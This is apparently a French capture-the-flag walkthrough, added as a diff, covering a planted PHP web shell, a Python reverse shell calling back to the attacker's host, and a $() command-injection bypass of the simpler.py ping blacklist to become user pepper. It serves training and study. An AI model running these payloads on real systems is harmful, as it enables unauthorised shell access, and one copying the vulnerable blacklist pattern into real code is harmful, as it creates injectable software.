@@ -1363,39 +1363,550 @@ La réussite de cette opération dépend à la fois des privilèges MySQL du com
 
 #### Validation de l’exécution du fichier PHP
 
-### Obtention d’un reverse shell en tant que `www-data`
+Le fichier `shell.php` étant maintenant présent dans la racine web, tu vérifies qu’il est accessible depuis le navigateur et qu’il permet bien d’exécuter une commande système.
 
-#### Mise en écoute sur Kali avec `rlwrap` et `netcat`
+Le script attend la commande à exécuter dans le paramètre GET `command`. Tu appelles donc la page avec la commande `id` :
 
-#### Déclenchement du reverse shell
+```url
+http://jarvis.htb/shell.php?command=id
+```
 
-#### Vérification du contexte d’exécution
+La commande `id` affiche l’identité et les groupes du compte système utilisé pour exécuter le processus PHP.
+
+La page retourne un résultat de ce type :
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Cette réponse confirme que le fichier PHP a correctement été écrit dans la racine web et qu’il est interprété par Apache.
+
+Elle démontre également que tu peux désormais exécuter des commandes sur le serveur avec les privilèges du compte :
+
+```text
+www-data
+```
+
+Tu disposes donc d’un mini shell PHP fonctionnel. Cet accès permet d’exécuter ponctuellement des commandes depuis le navigateur, mais il reste peu pratique pour travailler de manière interactive.
+
+La prochaine étape consiste à l’utiliser pour déclencher un reverse shell vers ta machine Kali.
+
+### Obtention d’un reverse shell
+
+#### Établissement de la connexion
+
+Le mini shell PHP permet désormais d’exécuter ponctuellement des commandes sur le serveur. Cet accès reste toutefois peu pratique, car chaque commande doit être transmise dans le paramètre `command` de l’URL.
+
+Tu vas donc l’utiliser pour établir un reverse shell vers ta machine Kali.
+
+Tu commences par ouvrir un port d’écoute sur Kali avec `netcat`. L’utilisation de `rlwrap` améliore le comportement du terminal et permet notamment de conserver un historique des commandes :
+
+```bash
+rlwrap -cAr nc -lvnp 4444
+```
+
+Tu utilises un reverse shell Python qui lance `/bin/bash` avec `pty.spawn()` :
+
+```bash
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.x.x",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+```
+
+Cette commande :
+
+- ouvre une connexion vers l’adresse de ton interface VPN `tun0` sur le port `4444` ;
+- redirige les entrées et sorties standards vers la socket ;
+- lance `/bin/bash` dans un pseudo-terminal avec `pty.spawn()`.
+
+Comme elle contient plusieurs guillemets et caractères spéciaux susceptibles d’être mal interprétés dans une URL, tu l’encodes en Base64 depuis Kali :
+
+```bash
+printf '%s' 'python3 -c '\''import socket,os,pty;s=socket.socket();s.connect(("10.10.x.x",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'\''' | base64 -w0
+```
+
+Tu obtiens ainsi une chaîne Base64 représentant la commande complète. Dans la suite, elle sera simplement désignée par :
+
+```text
+CHAINE_BASE64
+```
+
+Tu demandes ensuite au mini shell PHP de décoder puis d’exécuter cette chaîne.
+
+Pour cela, tu saisis directement dans le navigateur une URL construite sur le modèle suivant :
+
+```text
+http://jarvis.htb/shell.php?command=echo%20%27CHAINE_BASE64%27%20%7C%20base64%20-d%20%7C%20bash
+```
+
+Le paramètre `command` correspond à la commande suivante, encodée afin de pouvoir être correctement transmise dans l’URL :
+
+```bash
+echo 'CHAINE_BASE64' | base64 -d | bash
+```
+
+Le listener reçoit alors une connexion provenant de Jarvis :
+
+```text
+rlwrap -cAr nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.x.x] from (UNKNOWN) [10.129.43.56] 40638
+www-data@jarvis:/var/www/html$
+```
+
+Le prompt apparaît immédiatement. Tu vérifies que le shell est bien associé à un pseudo-terminal :
+
+```bash
+tty
+```
+
+La commande retourne :
+
+```text
+/dev/pts/2
+```
+
+Tu contrôles ensuite l’identité du compte utilisé, ses groupes ainsi que le répertoire de travail courant :
+
+```bash
+whoami
+id
+pwd
+```
+
+Les commandes retournent :
+
+```text
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/var/www/html
+```
+
+Ces résultats confirment que le reverse shell a bien été établi avec les privilèges du compte `www-data`, que tu te trouves dans la racine web de l’application et que le shell dispose d’un pseudo-terminal.
 
 #### Stabilisation du reverse shell
 
+Le reverse shell dispose déjà d’un pseudo-terminal grâce à `pty.spawn()`. Il reste néanmoins utile d’ajuster le terminal afin d’obtenir un comportement plus confortable et plus fiable.
+
+Tu définis d’abord un type de terminal compatible :
+
+```bash
+export TERM=xterm
+```
+
+Tu suspends ensuite temporairement le reverse shell avec :
+
+```text
+Ctrl+Z
+```
+
+De retour dans le terminal Kali, tu désactives l’écho local et replaces le listener au premier plan :
+
+```bash
+stty raw -echo; fg
+```
+
+Après avoir appuyé sur `Entrée`, tu réinitialises le terminal depuis Jarvis :
+
+```bash
+reset
+```
+
+Tu complètes enfin l’environnement du shell :
+
+```bash
+export SHELL=/bin/bash
+export TERM=xterm
+stty rows 40 columns 120
+```
+
+Le reverse shell est maintenant suffisamment stable pour poursuivre l’énumération locale et interagir correctement avec les programmes qui attendent une saisie.
+
+La procédure est basée sur la recette dédiée :
+
+{{< recette "stabiliser-reverse-shell" >}}
+
 ### Recherche d’un passage vers un utilisateur local
+
+Après avoir obtenu un shell en tant que `www-data`, tu examines les répertoires personnels présents sur la machine afin d’identifier les utilisateurs locaux :
+
+```bash
+ls -l /home
+```
+
+La sortie révèle notamment l’existence du répertoire suivant :
+
+```text
+/home/pepper
+```
+
+Tu peux également constater que le fichier `user.txt`, correspondant au premier objectif de la machine, se trouve dans ce répertoire :
+
+```text
+/home/pepper/user.txt
+```
+
+Le compte `pepper` devient donc une cible logique pour la suite de l’exploitation. Il faut maintenant rechercher un moyen de quitter le contexte limité de `www-data` et d’exécuter des commandes avec les privilèges de cet utilisateur.
 
 #### Consultation des permissions sudo de `www-data`
 
-#### Découverte du script `simpler.py`
+Tu commences par consulter les permissions `sudo` accordées au compte courant :
 
-#### Analyse du fonctionnement du script
+```bash
+sudo -l
+```
+
+La commande retourne :
+
+```text
+Matching Defaults entries for www-data on jarvis:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+User www-data may run the following commands on jarvis:
+    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
+```
+
+Cette sortie révèle que `www-data` est autorisé à exécuter le script suivant avec les privilèges de l’utilisateur `pepper` :
+
+```text
+/var/www/Admin-Utilities/simpler.py
+```
+
+La directive `NOPASSWD` indique qu’aucun mot de passe n’est demandé pour lancer cette commande.
+
+L’autorisation ne permet pas d’exécuter le script en tant que `root`, mais uniquement en tant que `pepper`. La commande doit donc préciser explicitement cet utilisateur :
+
+```bash
+sudo -u pepper /var/www/Admin-Utilities/simpler.py
+```
+
+Ce script constitue désormais la piste principale pour obtenir un accès en tant que `pepper` et atteindre le fichier `user.txt`.
+
+#### Analyse du fonctionnement du script `simpler.py`
+
+Tu affiches maintenant le contenu du script afin de comprendre son fonctionnement :
+
+```bash
+cat /var/www/Admin-Utilities/simpler.py
+```
+
+```python
+#!/usr/bin/env python3
+from datetime import datetime
+import sys
+import os
+from os import listdir
+import re
+
+def show_help():
+    message='''
+********************************************************
+* Simpler   -   A simple simplifier ;)                 *
+* Version 1.0                                          *
+********************************************************
+Usage:  python3 simpler.py [options]
+
+Options:
+    -h/--help   : This help
+    -s          : Statistics
+    -l          : List the attackers IP
+    -p          : ping an attacker IP
+    '''
+    print(message)
+
+def show_header():
+    print('''***********************************************
+     _                 _                       
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+***********************************************
+''')
+
+def show_statistics():
+    path = '/home/pepper/Web/Logs/'
+    print('Statistics\n-----------')
+    listed_files = listdir(path)
+    count = len(listed_files)
+    print('Number of Attackers: ' + str(count))
+    level_1 = 0
+    dat = datetime(1, 1, 1)
+    ip_list = []
+    reks = []
+    ip = ''
+    req = ''
+    rek = ''
+    for i in listed_files:
+        f = open(path + i, 'r')
+        lines = f.readlines()
+        level2, rek = get_max_level(lines)
+        fecha, requ = date_to_num(lines)
+        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
+        if fecha > dat:
+            dat = fecha
+            req = requ
+            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
+        if int(level2) > int(level_1):
+            level_1 = level2
+            ip_list = [ip]
+            reks=[rek]
+        elif int(level2) == int(level_1):
+            ip_list.append(ip)
+            reks.append(rek)
+        f.close()
+	
+    print('Most Risky:')
+    if len(ip_list) > 1:
+        print('More than 1 ip found')
+    cont = 0
+    for i in ip_list:
+        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
+        cont = cont + 1
+	
+    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)
+	
+def list_ip():
+    print('Attackers\n-----------')
+    path = '/home/pepper/Web/Logs/'
+    listed_files = listdir(path)
+    for i in listed_files:
+        f = open(path + i,'r')
+        lines = f.readlines()
+        level,req = get_max_level(lines)
+        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
+        f.close()
+
+def date_to_num(lines):
+    dat = datetime(1,1,1)
+    ip = ''
+    req=''
+    for i in lines:
+        if 'Level' in i:
+            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
+            regex = '(\d+)-(.*)-(\d+)(.*)'
+            logEx=re.match(regex, fecha).groups()
+            mes = to_dict(logEx[1])
+            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
+            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
+            if fecha > dat:
+                dat = fecha
+                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
+    return dat, req
+			
+def to_dict(name):
+    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
+    return month_dict[name]
+	
+def get_max_level(lines):
+    level=0
+    for j in lines:
+        if 'Level' in j:
+            if int(j.split(' ')[4]) > int(level):
+                level = j.split(' ')[4]
+                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
+    return level, req
+	
+def exec_ping():
+    forbidden = ['&', ';', '-', '`', '||', '|']
+    command = input('Enter an IP: ')
+    for i in forbidden:
+        if i in command:
+            print('Got you')
+            exit()
+    os.system('ping ' + command)
+
+if __name__ == '__main__':
+    show_header()
+    if len(sys.argv) != 2:
+        show_help()
+        exit()
+    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
+        show_help()
+        exit()
+    elif sys.argv[1] == '-s':
+        show_statistics()
+        exit()
+    elif sys.argv[1] == '-l':
+        list_ip()
+        exit()
+    elif sys.argv[1] == '-p':
+        exec_ping()
+        exit()
+    else:
+        show_help()
+        exit()
+
+```
+
+
+
+Le programme est écrit en Python 3 et propose plusieurs options :
+
+```text
+-h / --help : afficher l’aide
+-s          : afficher des statistiques
+-l          : lister les adresses IP des attaquants
+-p          : envoyer un ping vers une adresse IP
+```
+
+En examinant rapidement ces possibilités, tu constates que les options `-h`, `-s` et `-l` se contentent d’afficher des informations.
+
+La seule option permettant réellement à l’utilisateur de fournir une valeur au script est donc :
+
+```text
+-p
+```
+
+Elle constitue dès lors la piste la plus intéressante à analyser.
+
+Lorsqu’elle est utilisée, le bloc principal appelle la fonction `exec_ping()` :
+
+```python
+elif sys.argv[1] == '-p':
+    exec_ping()
+    exit()
+```
+
+Cette fonction contient le code suivant :
+
+```python
+def exec_ping():
+    forbidden = ['&', ';', '-', '`', '||', '|']
+    command = input('Enter an IP: ')
+    for i in forbidden:
+        if i in command:
+            print('Got you')
+            exit()
+    os.system('ping ' + command)
+```
+
+Le script demande d’abord à l’utilisateur de saisir une adresse IP :
+
+```text
+Enter an IP:
+```
+
+Il vérifie ensuite que la valeur fournie ne contient aucun des caractères ou opérateurs placés dans la liste `forbidden` :
+
+```python
+['&', ';', '-', '`', '||', '|']
+```
+
+Lorsqu’un élément interdit est détecté, le programme affiche :
+
+```text
+Got you
+```
+
+puis s’arrête.
+
+Dans le cas contraire, la valeur saisie est directement concaténée à la commande suivante :
+
+```python
+os.system('ping ' + command)
+```
+
+Le programme construit donc une chaîne équivalente à :
+
+```bash
+ping VALEUR_SAISIE
+```
+
+puis la transmet à un interpréteur de commandes avec `os.system()`.
+
+La saisie n’est cependant jamais vérifiée comme une véritable adresse IP. Elle est seulement comparée à une liste limitée de caractères interdits avant d’être intégrée directement dans une commande système.
+
+Il faut donc rechercher une syntaxe comprise par le shell qui permettrait d’ajouter une commande sans employer les caractères filtrés.
 
 #### Identification d’une injection de commandes
 
-### Exploitation de `simpler.py`
+Le filtrage mis en place par le script bloque plusieurs séparateurs classiques, mais il n’interdit pas la syntaxe de substitution de commandes du shell :
 
-#### Exécution du script avec les droits de `pepper`
+```bash
+$(commande)
+```
 
-#### Contournement du filtrage des commandes
+Cette syntaxe demande au shell d’exécuter d’abord la commande placée entre les parenthèses, puis de remplacer l’expression par sa sortie.
 
-#### Obtention d’un shell en tant que `pepper`
+Tu lances le script avec l’option `-p`, en demandant son exécution avec les privilèges de l’utilisateur `pepper` :
 
-### Validation de l’accès utilisateur
+```bash
+sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+```
 
-#### Vérification de l’identité et du répertoire personnel
+Le programme affiche alors :
+
+```text
+Enter an IP:
+```
+
+Le reverse shell utilisé doit toutefois disposer d’un pseudo-terminal fonctionnel. Dans le cas contraire, le script peut recevoir immédiatement une ligne vide ou ne pas permettre l’interaction correcte avec le shell lancé ensuite.
+
+Après avoir obtenu un terminal associé à un périphérique de type `/dev/pts`, tu fournis la saisie suivante :
+
+```bash
+$(bash </dev/tty >/dev/tty)
+```
+
+La commande construite par le script devient alors équivalente à :
+
+```bash
+ping $(bash </dev/tty >/dev/tty)
+```
+
+Avant d’exécuter `ping`, le shell interprète la substitution de commandes et lance un nouveau processus Bash.
+
+La redirection :
+
+```text
+</dev/tty
+```
+
+permet à ce nouveau shell de lire les commandes saisies au clavier, tandis que :
+
+```text
+>/dev/tty
+```
+
+redirige sa sortie directement vers le terminal courant.
+
+Comme `simpler.py` a été lancé avec `sudo -u pepper`, le processus Bash hérite des privilèges de cet utilisateur.
+
+Tu vérifies alors le nouveau contexte d’exécution :
+
+```bash
+id
+```
+
+La commande retourne :
+
+```text
+uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
+```
+
+Le prompt confirme également le changement d’utilisateur :
+
+```text
+pepper@jarvis:/var/www/html$
+```
+
+L’injection de commandes est donc validée. La liste noire du script est insuffisante, car elle ne bloque pas la substitution de commandes avec `$()`.
+
+L’ajout des redirections vers `/dev/tty` permet en outre d’obtenir un shell réellement interactif en tant que `pepper`.
 
 #### Lecture de `user.txt`
+
+Maintenant que tu disposes d’un shell en tant que `pepper`, tu peux accéder à son répertoire personnel et lire le premier drapeau de la machine :
+
+```bash
+cat /home/pepper/user.txt
+3c19xxxxxxxxxxxxxxxxxxxxxxxxf975
+```
+
+L’accès au compte `pepper` est donc validé. Tu peux désormais passer à l'escalade de privilèges vers `root`.
 
 
 ---
